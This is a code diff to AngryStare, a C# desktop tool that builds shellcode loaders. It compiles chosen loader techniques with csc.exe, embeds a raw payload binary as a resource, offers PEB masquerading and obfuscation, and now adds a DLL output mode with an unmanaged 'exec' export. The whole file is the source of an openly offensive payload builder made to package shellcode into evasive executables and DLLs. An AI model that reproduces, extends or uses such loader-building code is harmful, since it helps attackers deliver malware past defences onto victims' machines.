@@ -18,6 +18,7 @@ using System.Windows.Shapes;
 using Microsoft.Win32;
 using AngryStare.UI;
 using dnlib.DotNet;
+using dnlib.DotNet.Writer;
 
 namespace AngryStare
 {
@@ -27,11 +28,14 @@ namespace AngryStare
     public partial class MainWindow : Window
     {
         public string SelectTechPath;
+        public string SelectValue;
         public string IconPath;
         public string MasPebOriginFile;
         public string[] BufferString;
         public byte[] BuffByte;
         public static bool UseRaw = false;
+        public static string exeordll = "winexe";
+        
 
 
         public MainWindow()
@@ -39,6 +43,7 @@ namespace AngryStare
             WindowStartupLocation = WindowStartupLocation.CenterScreen;
             InitializeComponent();
             SetComboBox();
+            SetDLLOrEXE();
             SetCompilerBox();
             SelectTechPath = Directory.GetParent(Environment.CurrentDirectory).ToString() + $@"\Technique\{Combo_Tech.Text}";
             IconPath = "";
@@ -79,6 +84,7 @@ namespace AngryStare
                     {
 
                         FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
+                        //FileName = @"C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe",
                         UseShellExecute = false,
                         CreateNoWindow = true,
                         WindowStyle = ProcessWindowStyle.Hidden,
@@ -87,7 +93,7 @@ namespace AngryStare
                         RedirectStandardError = true
                     };
                     p.Start();
-                   Console.WriteLine($"[+] CSC OUPTUT: "+p.StandardOutput.ReadToEnd().ToString());
+                    Console.WriteLine($"[+] CSC OUPTUT: "+p.StandardOutput.ReadToEnd().ToString());
                 }
                 
             }
@@ -96,21 +102,60 @@ namespace AngryStare
             // 当使用bin为payload时需要编译完通过dnlib即时添加资源文件
             if (UseRaw == true)
             {
-                
+
                 ModuleDefMD module = ModuleDefMD.Load(outputfile.Text);
                 module.Resources.Add(new EmbeddedResource("dotnetlib", File.ReadAllBytes(Rawbinpath.Text)));
-                module.Write(outputfile.Text.TrimEnd('e'));
-                module.Dispose();
+                if (dllorexe.SelectedItem.ToString() == "DLL")
+                {
+                    module.Write(outputfile.Text.TrimEnd('l'));
+                    module.Dispose();
+                    File.Delete(outputfile.Text);
+                    File.Move(outputfile.Text.TrimEnd('l'), outputfile.Text);
+                }
+                else 
+                { 
+                    module.Write(outputfile.Text.TrimEnd('e'));
+                    module.Dispose();
+                    File.Delete(outputfile.Text);
+                    File.Move(outputfile.Text.TrimEnd('e'), outputfile.Text);
+                }
+                
+            }
+            //当生成dll时通过dnlib添加导出函数
+            if (dllorexe.SelectedItem.ToString() == "DLL")
+            {
+                ModuleDef moduledll = ModuleDefMD.Load(outputfile.Text);
+                var type = moduledll.GetTypes().FirstOrDefault(t => t.Name == "Execute");
+                var method = type.Methods.FirstOrDefault(m => m.Name == "exec");
+                method.ExportInfo = new MethodExportInfo();
+                method.IsUnmanagedExport = true;
+
+                var opts = new ModuleWriterOptions(moduledll);
+                opts.PEHeadersOptions.Machine = dnlib.PE.Machine.AMD64;
+                opts.Cor20HeaderOptions.Flags = 0;
+
+                moduledll.Write(outputfile.Text.TrimEnd('l'),opts);
+                moduledll.Dispose();
                 File.Delete(outputfile.Text);
-                File.Move(outputfile.Text.TrimEnd('e'), outputfile.Text);
+                File.Move(outputfile.Text.TrimEnd('l'), outputfile.Text);
             }
 
             //启用混淆
             if (Simplyobfuscate.IsChecked == true) 
             {
-                HatTrick.Obfuscate.obfuscateStart(outputfile.Text, outputfile.Text.TrimEnd('e'));
-                File.Delete(outputfile.Text);
-                File.Move(outputfile.Text.TrimEnd('e'), outputfile.Text);
+                Console.WriteLine($"[+] Waiting for Obfuscate {dllorexe.SelectedItem.ToString()}....");
+                if (dllorexe.SelectedItem.ToString() == "DLL")
+                {
+                    HatTrick.Obfuscate.obfuscateStart(outputfile.Text, outputfile.Text.TrimEnd('l'));
+                    File.Delete(outputfile.Text);
+                    File.Move(outputfile.Text.TrimEnd('l'), outputfile.Text);
+                }
+                else
+                {
+                    HatTrick.Obfuscate.obfuscateStart(outputfile.Text, outputfile.Text.TrimEnd('e'));
+                    File.Delete(outputfile.Text);
+                    File.Move(outputfile.Text.TrimEnd('e'), outputfile.Text);
+                }
             }
             
             Console.WriteLine($"[+] Complier Over : {outputfile.Text}");
@@ -121,7 +166,7 @@ namespace AngryStare
         public void SetCompilerBox()
         {
 
-            CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:winexe *.cs /unsafe /nologo /platform:x64 /warn:0";
+            CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:{exeordll} *.cs /unsafe /nologo /platform:x64 /warn:0";
 
         }
 
@@ -135,6 +180,13 @@ namespace AngryStare
                 Combo_Tech.Items.Add(a.ToString());
             }
 
+        }
+        public void SetDLLOrEXE() 
+        {
+           // dllorexe.SelectedItem
+            dllorexe.Items.Add("EXE");
+            dllorexe.Items.Add("DLL");
+            dllorexe.Text = "EXE";
         }
         public byte[] GetBuffer()
         {
@@ -164,13 +216,37 @@ namespace AngryStare
             try
             {
 
-                string SelectValue = Combo_Tech.SelectedItem.ToString();
+                SelectValue = Combo_Tech.SelectedItem.ToString();
                 Console.WriteLine($"[+] Use {SelectValue} Technique");
                 string csfile = SelectTechPath;
-                CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:winexe {csfile}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";
+                CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:{exeordll} {csfile}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";
             }
             catch (Exception ex) { Console.WriteLine(ex); return; }
 
+        }
+        private void dllorexe_SelectionChanged(object sender, SelectionChangedEventArgs e)
+        {
+           
+            try 
+            {
+                if (dllorexe.SelectedItem.ToString() == "EXE") 
+                {
+                                       
+                    exeordll = "winexe";
+                    CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:{exeordll} {SelectTechPath}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";
+                    
+                }
+                if (dllorexe.SelectedItem.ToString() == "DLL")
+                {
+                    exeordll = "library";
+                    CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:{exeordll} {SelectTechPath}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";
+
+                }
+            }
+            catch 
+            {
+            
+            }
         }
 
         private void Button_dir_Click(object sender, RoutedEventArgs e)
@@ -178,14 +254,21 @@ namespace AngryStare
             ClearLog();
             if (Combo_Tech.SelectedItem == null) { Console.WriteLine("ERROR : Choose a Technique"); return; }
             SaveFileDialog saveFileDialog = new SaveFileDialog();
-            saveFileDialog.Filter = "exe file (*.exe)|*.exe";
+            if (exeordll == "winexe")
+            {
+                saveFileDialog.Filter = "exe file (*.exe)|*.exe";
+            }
+            else 
+            {
+                saveFileDialog.Filter = "dll file (*.dll)|*.dll";
+            }
             saveFileDialog.ShowDialog();
             outputfile.Text = saveFileDialog.FileName;
             try
             {
-                string SelectValue = Combo_Tech.SelectedItem.ToString();
+                SelectValue = Combo_Tech.SelectedItem.ToString();
                 string csfile = SelectTechPath;
-                CompileCommand.Text = $@"csc.exe /out:{outputfile.Text} /t:winexe {csfile}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";
+                CompileCommand.Text = $@"csc.exe /out:{outputfile.Text} /t:{exeordll} {csfile}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";
             }
             catch (Exception ex)
             {
@@ -276,6 +359,10 @@ namespace AngryStare
         }
         public static void WirteProgramWithHT(string ProgramPath, string tech, string pebfile,bool MasqueradePEB) 
         {
+            //if (exeordll == "library") 
+            //{
+            //    return;
+            //}
             String MasqueradePEBString = string.Empty;
 
             FileStream fs = new FileStream(ProgramPath + @"\Program.cs", FileMode.Create);
@@ -297,7 +384,7 @@ namespace AngryStare
             sw.WriteLine(MasqueradePEBString);
 
 
-            sw.WriteLine(@"Execute.Exec();
+            sw.WriteLine(@"Execute.exec();
             }
         }
     }");
